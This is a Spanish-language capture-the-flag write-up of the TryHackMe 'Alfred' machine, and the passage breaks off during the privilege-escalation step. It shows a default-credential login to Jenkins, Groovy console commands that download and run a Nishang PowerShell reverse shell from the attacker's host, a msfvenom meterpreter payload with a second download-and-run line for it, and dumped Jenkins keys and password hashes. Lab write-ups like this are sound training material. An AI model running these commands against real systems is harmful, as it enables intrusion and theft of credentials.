# üßë‚Äçüç≥ ALFRED

En esta sala, aprenderemos c√≥mo aprovechar una configuraci√≥n err√≥nea com√∫n en un servidor de automatizaci√≥n ampliamente utilizado (Jenkins: esta herramienta se utiliza para crear canales de integraci√≥n/desarrollo continuo que permiten a los desarrolladores implementar autom√°ticamente su c√≥digo una vez que realizaron cambios). . Despu√©s de lo cual, usaremos un interesante m√©todo de escalada de privilegios para obtener acceso completo al sistema.&#x20;

Dado que se trata de una aplicaci√≥n de Windows, usaremos [Nishang](https://github.com/samratashok/nishang)  para obtener acceso inicial. El repositorio contiene un √∫til conjunto de scripts para acceso inicial, enumeraci√≥n y escalada de privilegios. En este caso, usaremos los [scripts de shell inversos](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) .

En la m√°quina "Alfred" de TryHackMe, se aborda la explotaci√≥n de Jenkins por credenciales debiles o por defecto para obtener un shell inicial y, posteriormente, se escalan los privilegios mediante la explotaci√≥n de tokens de autenticaci√≥n de Windows. Aqu√≠ est√° un resumen paso a paso:

#### Acceso Inicial

1. **Escaneo Inicial:** Se identifican 3 puertos TCP abiertos mediante un escaneo de Nmap.
2. **Credenciales del Panel de Inicio de Sesi√≥n:** Se descubren las credenciales predeterminadas del panel de inicio de sesi√≥n de Jenkins como "admin:admin".
3. **Explotaci√≥n de Jenkins:** Se utiliza el script Invoke-PowerShellTcp de Nishang sirviendolo desde nuestro servidor python, descargandolo en jenkins y ejecutandolo desde el panel de ejecucion de script qeu nos daba jenkins basado en java, para obtener acceso inicial al sistema a trav√©s de un shell inverso.

#### Cambio de Shell

4. **Generaci√≥n de Payload:** Se utiliza msfvenom para generar un payload de exe para el cambio de shell.
5. **Descarga y Ejecuci√≥n del Payload:** La carga √∫til se descarga en el sistema de destino y se ejecuta.
6. **Configuraci√≥n de Metasploit:** Se configura un controlador Metasploit con multi handler para establecer una conexi√≥n de sesion meterpreter.

#### Escalada de Privilegios

7. **Tokens y Privilegios:** Se examinan los tokens y privilegios disponibles con comandos como `whoami /priv` y `list_tokens -g`.
8. **Uso de Inc√≥gnito:** Se carga y utiliza el m√≥dulo Incognito en Metasploit para explotar privilegios.
9. **Migraci√≥n de Proceso:** Se migra a un proceso seguro como services.exe para garantizar los permisos adecuados.
10. **Lectura de la Bandera de Usuario:** Se pasa de nuevo a una shell comun y se  lee la bandera user.txt ubicada en alg√∫n lugar del sistema.
11. **Lectura de la Bandera de Root:** Finalmente, con el comando search anterior buscamos y encontramos la ruta del  la bandera root.txt y se lee el archivo root.txt ubicado en C:\Windows\System32\config.

Este enfoque abarca desde la identificaci√≥n de servicios y credenciales hasta la explotaci√≥n inicial de Jenkins, el cambio de shell utilizando Metasploit y, finalmente, la escalada de privilegios mediante la explotaci√≥n de tokens de autenticaci√≥n de Windows y el migrado de proceso pid para asegurarnos el autority system en todo el sistema.

<pre class="language-python"><code class="lang-python">// Some code

PENTESTING OFENSIVO:

MAQUINA ALFRED (JENKINS):



VERIFICAMOS CONECCION Y NO RESPONDE TRASAS ICMP; POR QUE ES WINDOWS:


‚îå‚îÄ‚îÄ(root„âøkali)-[~]
‚îî‚îÄ# ping -c 1 10.10.234.163
PING 10.10.234.163 (10.10.234.163) 56(84) bytes of data.


INVESTIGANDO URL : 10.10.234.163:80   :


&#x3C;br>
RIP Bruce Wayne&#x3C;br>&#x3C;br>
Donations to &#x3C;strong>alfred@wayneenterprises.com&#x3C;/strong> are greatly appreciated.
&#x3C;/center>




VERIFICO POSIBLES OTROS DIRECTORIOS :



‚îå‚îÄ‚îÄ(root„âøkali)-[~]
‚îî‚îÄ# gobuster dir -u http://10.10.234.163/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.234.163/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2024/01/21 23:10:37 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 289]
Progress: 4249 / 4615 (92.07%)===============================================================
2024/01/21 23:10:38 Finished
===============================================================



ESCANE DE PUERTOS Y VULNERABILIDADES:



‚îå‚îÄ‚îÄ(root„âøkali)-[~]
‚îî‚îÄ# nmap -sS -sV -O -Pn --script "vuln" 10.10.234.163
Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-21 22:59 UTC
Stats: 0:00:02 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Stats: 0:05:17 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 86.10% done; ETC: 23:05 (0:00:49 remaining)
Stats: 0:10:13 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.55% done; ETC: 23:10 (0:00:03 remaining)
Nmap scan report for ip-10-10-234-163.eu-west-1.compute.internal (10.10.234.163)
Host is up (0.0010s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Microsoft IIS httpd 7.5
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| vulners: 
|   cpe:/a:microsoft:internet_information_services:7.5: 
|       CVE-2010-3972   10.0    https://vulners.com/cve/CVE-2010-3972
|       SSV:20122       9.3     https://vulners.com/seebug/SSV:20122    *EXPLOIT*
|       CVE-2010-2730   9.3     https://vulners.com/cve/CVE-2010-2730
|       SSV:20121       4.3     https://vulners.com/seebug/SSV:20121    *EXPLOIT*
|_      CVE-2010-1899   4.3     https://vulners.com/cve/CVE-2010-1899
|_http-server-header: Microsoft-IIS/7.5
|_http-dombased-xss: Couldn't find any DOM based XSS.
3389/tcp open  tcpwrapped
|_ssl-ccs-injection: No reply from server (TIMEOUT)
8080/tcp open  http       Jetty 9.4.z-SNAPSHOT
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|_  /robots.txt: Robots file
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
MAC Address: 02:A5:BD:32:71:37 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2008 (90%), Microsoft Windows Server 2008 R2 or Windows 8 (90%), Microsoft Windows 7 SP1 (90%), Microsoft Windows 8.1 R1 (90%), Microsoft Windows Server 2008 or 2008 Beta 3 (89%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%), Microsoft Windows 7 Professional or Windows 8 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (89%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 767.71 seconds





CORROBORAMOS PUERTO 8080:




http://10.10.234.163:8080/robots.txt

# we don't want robots to click "build" links
User-agent: *
Disallow: /





http://10.10.234.163:8080/login?from=%2F



Welcome to Jenkins!
Username:
Contrase√±a:

Keep me signed in



NOS LOGRAMOS LOGUEAR CON ADMIN:ADMIN:






[Jenkins]Jenkins admin | Desconectar
b√∫squeda
 
2
Hay una nueva versi√≥n de Jenkins disponible (2.249.1). descargar (listado de cambios).
O actualizar autom√°ticamente
Go to plugin manager
Configure which of these warnings are shown
Warnings have been published for the following currently installed components.
Jenkins 2.190.1 core and libraries
Multiple security vulnerabilities in Jenkins 2.251 and earlier, LTS 2.235.3 and earlier
Multiple security vulnerabilities in Jenkins 2.227 and earlier, LTS 2.204.5 and earlier
Multiple vulnerabilities in Jenkins 2.218 and earlier, LTS 2.204.1 and earlier
Multiple security vulnerabilities in Jenkins 2.244 and earlier, LTS 2.235.1 and earlier
Subversion Plug-in 2.12.2
Stored XSS vulnerability
Git plugin 3.12.1
Stored XSS vulnerability
Email Extension Plugin 2.68
Missing hostname validation
Matrix Authorization Strategy Plugin 2.5
Stored XSS vulnerability
Timestamper 1.10
Stored XSS vulnerability
Credentials Binding Plugin 1.20
Improper masking of some secrets
Secrets are not masked in builds without build steps
Matrix Project Plugin 1.14
Stored XSS vulnerability in single axis builds tooltips
Stored XSS vulnerability in multiple axis builds tooltips
Lockable Resources plugin 2.6
CSRF vulnerability
Pipeline: Groovy 2.74
Sandbox bypass via default method parameter expression
Script Security Plugin 1.66
Sandbox bypass vulnerability
Sandbox bypass vulnerability
Stored XSS vulnerability
Sandbox bypass vulnerability
Sandbox bypass vulnerability
Mailer Plugin 1.29
Missing hostname validation
Manage Jenkins

ACTIVAR AUTO REFRESCO
Jenkins
 Nueva Tarea
 Personas
 Historial de trabajos
 Administrar Jenkins
 Mis vistas
 Lockable Resources
 Credentials
 New View
collapseTrabajos en la cola
No hay trabajos en la cola
collapseEstado del ejecutor de construcciones
1	Inactivo		
2	Inactivo		
a√±adir descripci√≥n
Todo
+
   S   
   W   
Nombre  ‚Üì
√öltimo √âxito   
√öltimo Fallo   
√öltima Duraci√≥n   
    
    
Correcto	100%	project	4 A√±o 2 Mes - #1	N/D	0.42 Seg	Schedule a Build for project	 









EN EL SITIO WEB DEL PANEL DE ADMINISTRADOR DE JENKINS http://10.10.234.163:8080/computer/(master)/script:




 Consola de scripts
Escribe un 'script' Groovy script y ejecutal√≥ en el servidor. Es √∫til para depurar e investigar problemas. Usa 'println' para ver la salida (si usas System.out, se escribir√° en la salida 'stdout' del servidor, lo que es m√°s dif√≠cil de visualizar). Ejemplo:

println System.getenv("PATH")
println "uname -a".execute().text
Esta ejecuci√≥n se hace en la m√°quina virtual (JVM) del agente.

Todas las clases de todos los plugins son visibles. Los paquetes: jenkins.*, jenkins.model.*, hudson.*, y hudson.model.*, se importar√°n autom√°ticamente.


println "whoami".execute().text


Resultado
alfred\bruce



YA QUE VIMOS QUE PODEMOS EJECUTAR COMANDOS VAMOS A INTENTAR PASAR DESDE UN SERVIDOR PYTHON NUESTRO SCRIPT PARA OPTENER UNA REVERSE SHEL A LA ESCUCHA DE LA MISMA CON NETCAT:




println "powershell iex (New-Object Net.WebClient).DownloadString(\'http://10.10.217.63:8081/Invoke-PowerShellTcp.ps1\');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.217.63 -Port 443".execute().text


BINGO NUESTRO NETCAT ESCUCHO LA SHELL:

‚îå‚îÄ‚îÄ(root„âøkali)-[~/Downloads]
‚îî‚îÄ# python3 -m http.server 8081 
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
10.10.234.163 - - [22/Jan/2024 00:41:29] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
10.10.234.163 - - [22/Jan/2024 00:41:33] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -





‚îå‚îÄ‚îÄ(root„âøkali)-[~]
‚îî‚îÄ# nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.217.63] from (UNKNOWN) [10.10.234.163] 49334
Windows PowerShell running as user bruce on ALFRED
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins>whoami
alfred\bruce
PS C:\Program Files (x86)\Jenkins> 



PS C:\Program Files (x86)\Jenkins> dir


    Directory: C:\Program Files (x86)\Jenkins


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d----        10/26/2019   4:37 PM            jobs                              
d----        10/25/2019   9:54 PM            jre                               
d----        10/25/2019   9:55 PM            logs                              
d----        10/25/2019   9:55 PM            nodes                             
d----        10/25/2019   7:58 PM            plugins                           
d----        10/26/2019   4:38 PM            secrets                           
d----         10/3/2020   3:42 PM            updates                           
d----        10/25/2019   9:55 PM            userContent                       
d----        10/25/2019   9:55 PM            users                             
d----        10/25/2019   9:54 PM            war                               
d----        10/25/2019   7:58 PM            workflow-libs                     
d----        10/26/2019   4:38 PM            workspace                         
-a---         1/21/2024  10:27 PM          0 .lastStarted                      
-a---         1/21/2024  11:55 PM         36 .owner                            
-a---         1/21/2024  10:27 PM       1742 config.xml                        
-a---         1/21/2024  10:27 PM        156 hudson.model.UpdateCenter.xml     
-a---        10/25/2019   7:58 PM        374 hudson.plugins.git.GitTool.xml    
-a---        10/25/2019   9:55 PM       1712 identity.key.enc                  
-a---         1/21/2024  11:12 PM     117240 jenkins.err.log                   
-a---         9/25/2019   2:10 PM     371200 jenkins.exe                       
-a---          4/5/2015   6:05 PM        219 jenkins.exe.config                
-a---        10/25/2019   7:59 PM          7 jenkins.install.InstallUtil.lastEx
                                             ecVersion                         
-a---        10/25/2019   7:59 PM          7 jenkins.install.UpgradeWizard.stat
                                             e                                 
-a---        10/25/2019   7:59 PM        177 jenkins.model.JenkinsLocationConfi
                                             guration.xml                      
-a---         1/21/2024  10:26 PM       1992 jenkins.out.log                   
-a---         1/21/2024  10:26 PM          4 jenkins.pid                       
-a---        10/25/2019   9:55 PM        171 jenkins.telemetry.Correlator.xml  
-a---         9/25/2019   2:05 PM   78245883 jenkins.war                       
-a---         1/21/2024  10:26 PM      22494 jenkins.wrapper.log               
-a---         9/25/2019   2:10 PM       2875 jenkins.xml                       
-a---         1/21/2024  10:27 PM        907 nodeMonitors.xml                  
-a---        10/26/2019   4:39 PM        129 queue.xml.bak                     
-a---        10/25/2019   9:54 PM         64 secret.key                        
-a---        10/25/2019   9:54 PM          0 secret.key.not-so-secret          


PS C:\Program Files (x86)\Jenkins> type config.xml
&#x3C;?xml version='1.1' encoding='UTF-8'?>
&#x3C;hudson>
  &#x3C;disabledAdministrativeMonitors>
    &#x3C;string>hudson.diagnosis.ReverseProxySetupMonitor&#x3C;/string>
  &#x3C;/disabledAdministrativeMonitors>
  &#x3C;version>2.190.1&#x3C;/version>
  &#x3C;installStateName>RUNNING&#x3C;/installStateName>
  &#x3C;numExecutors>2&#x3C;/numExecutors>
  &#x3C;mode>NORMAL&#x3C;/mode>
  &#x3C;useSecurity>true&#x3C;/useSecurity>
  &#x3C;authorizationStrategy class="hudson.security.FullControlOnceLoggedInAuthorizationStrategy">
    &#x3C;denyAnonymousReadAccess>true&#x3C;/denyAnonymousReadAccess>
  &#x3C;/authorizationStrategy>
  &#x3C;securityRealm class="hudson.security.HudsonPrivateSecurityRealm">
    &#x3C;disableSignup>true&#x3C;/disableSignup>
    &#x3C;enableCaptcha>false&#x3C;/enableCaptcha>
  &#x3C;/securityRealm>
  &#x3C;disableRememberMe>false&#x3C;/disableRememberMe>
  &#x3C;projectNamingStrategy class="jenkins.model.ProjectNamingStrategy$DefaultProjectNamingStrategy"/>
  &#x3C;workspaceDir>${JENKINS_HOME}/workspace/${ITEM_FULL_NAME}&#x3C;/workspaceDir>
  &#x3C;buildsDir>${ITEM_ROOTDIR}/builds&#x3C;/buildsDir>
  &#x3C;jdks/>
  &#x3C;viewsTabBar class="hudson.views.DefaultViewsTabBar"/>
  &#x3C;myViewsTabBar class="hudson.views.DefaultMyViewsTabBar"/>
  &#x3C;clouds/>
  &#x3C;scmCheckoutRetryCount>0&#x3C;/scmCheckoutRetryCount>
  &#x3C;views>
    &#x3C;hudson.model.AllView>
      &#x3C;owner class="hudson" reference="../../.."/>
      &#x3C;name>all&#x3C;/name>
      &#x3C;filterExecutors>false&#x3C;/filterExecutors>
      &#x3C;filterQueue>false&#x3C;/filterQueue>
      &#x3C;properties class="hudson.model.View$PropertyList"/>
    &#x3C;/hudson.model.AllView>
  &#x3C;/views>
  &#x3C;primaryView>all&#x3C;/primaryView>
  &#x3C;slaveAgentPort>-1&#x3C;/slaveAgentPort>
  &#x3C;label>&#x3C;/label>
  &#x3C;crumbIssuer class="hudson.security.csrf.DefaultCrumbIssuer">
    &#x3C;excludeClientIPFromCrumb>false&#x3C;/excludeClientIPFromCrumb>
  &#x3C;/crumbIssuer>
  &#x3C;nodeProperties/>
  &#x3C;globalNodeProperties/>
&#x3C;/hudson>
PS C:\Program Files (x86)\Jenkins> 





PS C:\Program Files (x86)\Jenkins> type jenkins.xml
&#x3C;!--
The MIT License

Copyright (c) 2004-2017, Sun Microsystems, Inc., Kohsuke Kawaguchi, Oleg Nenashev, and other Jenkins contributors

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
-->

&#x3C;!--
  Windows service definition for Jenkins.

  To uninstall, run "jenkins.exe stop" to stop the service, then "jenkins.exe uninstall" to uninstall the service.
  Both commands don't produce any output if the execution is successful. 
-->
&#x3C;service>
  &#x3C;id>Jenkins&#x3C;/id>
  &#x3C;name>Jenkins&#x3C;/name>
  &#x3C;description>This service runs Jenkins automation server.&#x3C;/description>
  &#x3C;env name="JENKINS_HOME" value="%BASE%"/>
  &#x3C;!--
    if you'd like to run Jenkins with a specific version of Java, specify a full path to java.exe.
    The following value assumes that you have java in your PATH.
  -->
  &#x3C;executable>%BASE%\jre\bin\java&#x3C;/executable>
  &#x3C;arguments>-Xrs -Xmx256m -Dhudson.lifecycle=hudson.lifecycle.WindowsServiceLifecycle -jar "%BASE%\jenkins.war" --httpPort=8080 --webroot="%BASE%\war"&#x3C;/arguments>
  &#x3C;!--
    interactive flag causes the empty black Java window to be displayed.
    I'm still debugging this.
  &#x3C;interactive />
  -->
  &#x3C;logmode>rotate&#x3C;/logmode>

  &#x3C;onfailure action="restart" />
  
  &#x3C;!-- 
    In the case WinSW gets terminated and leaks the process, we want to abort
    these runaway JAR processes on startup to prevent corruption of JENKINS_HOME.
    So this extension is enabled by default.
  -->
  &#x3C;extensions>
    &#x3C;!-- This is a sample configuration for the RunawayProcessKiller extension. -->
    &#x3C;extension enabled="true" 
               className="winsw.Plugins.RunawayProcessKiller.RunawayProcessKillerExtension"
               id="killOnStartup">
      &#x3C;pidfile>%BASE%\jenkins.pid&#x3C;/pidfile>
      &#x3C;stopTimeout>10000&#x3C;/stopTimeout>
      &#x3C;stopParentFirst>false&#x3C;/stopParentFirst>
    &#x3C;/extension>
  &#x3C;/extensions>
  
  &#x3C;!-- See the referenced examples for more options -->
  
&#x3C;/service>





PS C:\Program Files (x86)\Jenkins> type secret.key
cb2ae36e1862a23b3adfd393282eae76f896f2efb0a4da79643e33afc616751e



PS C:\Program Files (x86)\Jenkins\secrets> type initialAdminPassword
44b934851a1b4275a4b23864b35eb382




PS C:\Program Files (x86)\Jenkins\secrets> type master.key
8f79dbdfea03f2e4403e72d9e16b683028de4ef9e00a448b6dd0f2b78258bd0f6c01c6922ffaa0c784038aa59e268fab0d58d10bd40110930f3db32a3bff82370458db4f0c7ec9c510e1b339119b5fd108256c37ab4d17d2503887b2ea27c8f55e0813777e3f4043310dfd3a17cc1267fa48b188a5fdd3f04f90be9da7927594



PS C:\Program Files (x86)\Jenkins\users> dir


    Directory: C:\Program Files (x86)\Jenkins\users


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d----        10/25/2019  10:16 PM            admin_2402805306885826995         
-a---        10/25/2019   9:55 PM        300 users.xml                         


PS C:\Program Files (x86)\Jenkins\users> type users.xml
&#x3C;?xml version='1.1' encoding='UTF-8'?>
&#x3C;hudson.model.UserIdMapper>
  &#x3C;version>1&#x3C;/version>
  &#x3C;idToDirectoryNameMap class="concurrent-hash-map">
    &#x3C;entry>
      &#x3C;string>admin&#x3C;/string>
      &#x3C;string>admin_2402805306885826995&#x3C;/string>
    &#x3C;/entry>
  &#x3C;/idToDirectoryNameMap>
&#x3C;/hudson.model.UserIdMapper>
PS C:\Program Files (x86)\Jenkins\users> 





PS C:\Program Files (x86)\Jenkins\users\admin_2402805306885826995> dir


    Directory: C:\Program Files (x86)\Jenkins\users\admin_2402805306885826995


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---        10/25/2019  10:16 PM       2854 config.xml                        


PS C:\Program Files (x86)\Jenkins\users\admin_2402805306885826995> type config.xml
&#x3C;?xml version='1.1' encoding='UTF-8'?>
&#x3C;user>
  &#x3C;version>10&#x3C;/version>
  &#x3C;id>admin&#x3C;/id>
  &#x3C;fullName>admin&#x3C;/fullName>
  &#x3C;description>&#x3C;/description>
  &#x3C;properties>
    &#x3C;jenkins.security.ApiTokenProperty>
      &#x3C;tokenStore>
        &#x3C;tokenList/>
      &#x3C;/tokenStore>
    &#x3C;/jenkins.security.ApiTokenProperty>
    &#x3C;com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin="credentials@2.3.0">
      &#x3C;domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash">
        &#x3C;entry>
          &#x3C;com.cloudbees.plugins.credentials.domains.Domain>
            &#x3C;specifications/>
          &#x3C;/com.cloudbees.plugins.credentials.domains.Domain>
          &#x3C;java.util.concurrent.CopyOnWriteArrayList/>
        &#x3C;/entry>
      &#x3C;/domainCredentialsMap>
    &#x3C;/com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty>
    &#x3C;hudson.tasks.Mailer_-UserProperty plugin="mailer@1.29">
      &#x3C;emailAddress>&#x3C;/emailAddress>
    &#x3C;/hudson.tasks.Mailer_-UserProperty>
    &#x3C;hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty plugin="email-ext@2.68">
      &#x3C;triggers/>
    &#x3C;/hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty>
    &#x3C;jenkins.security.LastGrantedAuthoritiesProperty>
      &#x3C;roles>
        &#x3C;string>authenticated&#x3C;/string>
      &#x3C;/roles>
      &#x3C;timestamp>1572029777633&#x3C;/timestamp>
    &#x3C;/jenkins.security.LastGrantedAuthoritiesProperty>
    &#x3C;hudson.model.MyViewsProperty>
      &#x3C;primaryViewName>&#x3C;/primaryViewName>
      &#x3C;views>
        &#x3C;hudson.model.AllView>
          &#x3C;owner class="hudson.model.MyViewsProperty" reference="../../.."/>
          &#x3C;name>all&#x3C;/name>
          &#x3C;filterExecutors>false&#x3C;/filterExecutors>
          &#x3C;filterQueue>false&#x3C;/filterQueue>
          &#x3C;properties class="hudson.model.View$PropertyList"/>
        &#x3C;/hudson.model.AllView>
      &#x3C;/views>
    &#x3C;/hudson.model.MyViewsProperty>
    &#x3C;org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin="display-url-api@2.3.2">
      &#x3C;providerId>default&#x3C;/providerId>
    &#x3C;/org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty>
    &#x3C;hudson.model.PaneStatusProperties>
      &#x3C;collapsed/>
    &#x3C;/hudson.model.PaneStatusProperties>
    &#x3C;hudson.security.HudsonPrivateSecurityRealm_-Details>
      &#x3C;passwordHash>#jbcrypt:$2a$10$mNcW44UpK2W/FfiniX6qfeIhqBnJqLQLw8MLaP/lTM1vmh.E6AGAS&#x3C;/passwordHash>
    &#x3C;/hudson.security.HudsonPrivateSecurityRealm_-Details>
    &#x3C;org.jenkinsci.main.modules.cli.auth.ssh.UserPropertyImpl>
      &#x3C;authorizedKeys>&#x3C;/authorizedKeys>
    &#x3C;/org.jenkinsci.main.modules.cli.auth.ssh.UserPropertyImpl>
    &#x3C;jenkins.security.seed.UserSeedProperty>
      &#x3C;seed>9c55e7a1a712f843&#x3C;/seed>
    &#x3C;/jenkins.security.seed.UserSeedProperty>
    &#x3C;hudson.search.UserSearchProperty>
      &#x3C;insensitiveSearch>true&#x3C;/insensitiveSearch>
    &#x3C;/hudson.search.UserSearchProperty>
  &#x3C;/properties>
&#x3C;/user>
PS C:\Program Files (x86)\Jenkins\users\admin_2402805306885826995> dir


    Directory: C:\Program Files (x86)\Jenkins\users\admin_2402805306885826995


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---        10/25/2019  10:16 PM       2854 config.xml                        


PS C:\Program Files (x86)\Jenkins\users\admin_2402805306885826995> cd ..
PS C:\Program Files (x86)\Jenkins\users> dir


    Directory: C:\Program Files (x86)\Jenkins\users


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d----        10/25/2019  10:16 PM            admin_2402805306885826995         
-a---        10/25/2019   9:55 PM        300 users.xml                         







PS C:\Program Files (x86)\Jenkins> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State   
=============================== ========================================= ========
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled 
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege         Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
SeTimeZonePrivilege             Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled










PS C:\Users> cd bruce
PS C:\Users\bruce> dir


    Directory: C:\Users\bruce


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d----        10/25/2019   8:05 PM            .groovy                           
d-r--        10/25/2019   9:51 PM            Contacts                          
d-r--        10/25/2019  11:22 PM            Desktop                           
d-r--        10/26/2019   4:43 PM            Documents                         
d-r--        10/26/2019   4:43 PM            Downloads                         
d-r--        10/25/2019   9:51 PM            Favorites                         
d-r--        10/25/2019   9:51 PM            Links                             
d-r--        10/25/2019   9:51 PM            Music                             
d-r--        10/25/2019  10:26 PM            Pictures                          
d-r--        10/25/2019   9:51 PM            Saved Games                       
d-r--        10/25/2019   9:51 PM            Searches                          
d-r--        10/25/2019   9:51 PM            Videos                            


BANDERA:



PS C:\Users\bruce> cd Desktop
PS C:\Users\bruce\Desktop> dir


    Directory: C:\Users\bruce\Desktop


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---        10/25/2019  11:22 PM         32 user.txt                          


PS C:\Users\bruce\Desktop> type user.txt
79007a09481963edf2e1321abd9ae2a0
 



AHORA NOS CONECTAMOS USANDO METASPLOIT Y CONSEGUIIMOS UNA SESSION DE METERPRETER PARA FACILITAR LA ESCALADA DE PRIVILEGIOS, ANTES CREAMOS UN PAYLOAD EXPLOIT CON MSFVENOM PARA CONSEGUIR LA SHELL METERPRETER REVERSA Y ESCUCHARLA CON MULTIHANDLER :




‚îå‚îÄ‚îÄ(root„âøkali)-[~/Downloads]
‚îî‚îÄ# msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.10.217.63 LPORT=4444 -f exe -o shell-paimon.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of exe file: 73802 bytes
Saved as: shell-paimon.exe







LO SERVIMOS CON SERVER PYTHON:



‚îå‚îÄ‚îÄ(root„âøkali)-[~/Downloads]
‚îî‚îÄ# python3 -m http.server 8081 
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
10.10.234.163 - - [22/Jan/2024 00:41:29] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
10.10.234.163 - - [22/Jan/2024 00:41:33] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -






DESCARAMOS EL ARCHIVO CREADO POR MSFVENOM EN LA MAQUINA VICTIMA JENKINS PARA LUEGO EJECUTARLO Y TENER LA CONEXION EN MULTIHANDLER CON LA SESIUON DE METERPRETER:



PRUEBAS NOMAS:


println "powershell iex (New-Object Net.WebClient).DownloadString(\'http://10.10.217.63:8081/shell-paimon.exe\');shell-paimon.exe".execute().text

